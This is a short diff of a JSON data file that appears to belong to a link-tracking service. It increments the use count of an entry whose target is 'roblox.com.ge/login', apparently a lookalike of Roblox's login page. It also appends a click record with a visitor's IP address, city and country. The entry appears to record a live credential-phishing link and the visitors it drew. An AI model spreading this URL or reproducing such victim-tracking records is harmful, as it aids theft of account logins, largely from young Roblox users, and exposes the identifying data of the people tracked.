@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1429,
+    "useCount": 1430,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11600,6 +11600,14 @@
         "city": "Binangonan",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777430570521,
+        "ip": "49.237.68.53",
+        "country": "Thailand",
+        "city": "Bangkok",
+        "flag": "🇹🇭",
+        "countryCode": "TH"
       }
     ]
   },
